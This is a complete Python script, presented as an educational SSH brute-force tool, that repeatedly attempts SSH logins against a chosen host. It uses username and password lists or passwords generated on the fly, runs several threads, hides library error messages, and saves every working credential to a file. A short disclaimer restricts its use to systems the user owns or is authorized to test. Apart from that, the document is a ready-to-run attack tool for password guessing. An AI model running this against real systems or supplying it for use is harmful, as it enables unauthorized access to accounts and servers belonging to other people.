#!/usr/bin/env python3
"""
SSH Cracker Tool
Author: [Your Name]
Description: Educational SSH brute-force tool for ethical penetration testing.
WARNING: Use this tool only in environments you own or have explicit permission to test.
"""

import paramiko
import socket
import itertools
import argparse
import threading
import string
import contextlib
import sys
import queue
import os
import time
from colorama import Fore, Style, init

# Colorama initialization
init(autoreset=True)

# Color constants
GREEN = Fore.GREEN
RED = Fore.RED
BLUE = Fore.BLUE
RESET = Style.RESET_ALL

# Queue to manage work across threads
q = queue.Queue()


@contextlib.contextmanager
def suppress_stderr():
    """Suppress SSH library stderr messages (e.g., paramiko warnings)."""
    with open(os.devnull, 'w') as devnull:
        old_stderr = sys.stderr
        sys.stderr = devnull
        try:
            yield
        finally:
            sys.stderr = old_stderr


def is_ssh_open(hostname, port, username, password, retry_count=3, retry_delay=10):
    """Attempt SSH login to a host using provided credentials."""
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    with suppress_stderr():
        try:
            client.connect(hostname=hostname, port=port, username=username, password=password, timeout=3)
            client.close()
            print(f"{GREEN}[+] Found combo:\nHOST: {hostname}:{port}\nUSER: {username}\nPASS: {password}{RESET}")
            os.makedirs("output", exist_ok=True)
            with open("output/credentials.txt", "a") as f:
                f.write(f"{hostname}:{port}:{username}@{password}\n")
            return True
        except socket.timeout:
            print(f"{RED}[-] Host {hostname}:{port} timed out. Skipping...{RESET}")
        except paramiko.AuthenticationException:
            print(f"{RED}[-] Invalid credentials: {username}@{password}{RESET}")
        except paramiko.SSHException as e:
            print(f"{RED}[!] SSH Exception: {str(e)}. Retrying in {retry_delay}s...{RESET}")
            if retry_count > 0:
                time.sleep(retry_delay)
                return is_ssh_open(hostname, port, username, password, retry_count-1, retry_delay)
            else:
                print(f"{RED}[!] Skipping {username}@{password} after max retries.{RESET}")
        except Exception as e:
            print(f"{RED}[!] Unexpected error: {str(e)}{RESET}")
    return False


def load_lines(file_path):
    """Load lines from a file and return as a list."""
    with open(file_path, "r") as file:
        return [line.strip() for line in file.readlines() if line.strip()]


def generate_passwords(min_length, max_length, chars):
    """Generate passwords with specified character set and length range."""
    for length in range(min_length, max_length + 1):
        for password in itertools.product(chars, repeat=length):
            yield ''.join(password)


def worker(host, port):
    """Thread worker to attempt login from the credential queue."""
    while not q.empty():
        username, password = q.get()
        if is_ssh_open(host, port, username, password):
            return
        q.task_done()


def main():
    parser = argparse.ArgumentParser(description="SSH Brute-force Python Tool (For Educational Use Only)")
    parser.add_argument("--host", required=True, help="Target host (IP or hostname)")
    parser.add_argument("--port", type=int, default=22, help="Target SSH port (default: 22)")
    parser.add_argument("--passlist", help="File with passwords (one per line)")
    parser.add_argument("--userlist", help="File with usernames (one per line)")
    parser.add_argument("--user", help="Single username to test")
    parser.add_argument("--gen", action="store_true", help="Generate passwords on the fly")
    parser.add_argument("--min-length", type=int, default=3, help="Minimum password length")
    parser.add_argument("--max-length", type=int, default=4, help="Maximum password length")
    parser.add_argument("--chars", type=str, default=string.ascii_lowercase + string.digits, help="Characters for password generation")
    parser.add_argument("--threads", type=int, default=4, help="Number of threads")

    args = parser.parse_args()

    host = args.host
    port = args.port
    users = []
    passwords = []

    if not args.user and not args.userlist:
        print(f"{RED}[!] Provide a username or a userlist.{RESET}")
        sys.exit(1)

    if args.userlist:
        users = load_lines(args.userlist)
    else:
        users = [args.user]

    if args.passlist:
        passwords = load_lines(args.passlist)
    elif args.gen:
        passwords = generate_passwords(args.min_length, args.max_length, args.chars)
    else:
        print(f"{RED}[!] Provide a passlist or enable password generation (--gen).{RESET}")
        sys.exit(1)

    print(f"{BLUE}[+] Target: {host}:{port}{RESET}")
    print(f"{BLUE}[+] Loaded {len(users)} usernames{RESET}")
    print(f"{BLUE}[+] Passwords: {'from file' if args.passlist else 'generated'}{RESET}")

    for user in users:
        if isinstance(passwords, list):
            for pwd in passwords:
                q.put((user, pwd))
        else:
            for pwd in passwords:
                q.put((user, pwd))

    threads = []
    for _ in range(args.threads):
        t = threading.Thread(target=worker, args=(host, port))
        t.start()
        threads.append(t)

    for thread in threads:
        thread.join()


if __name__ == "__main__":
    main()
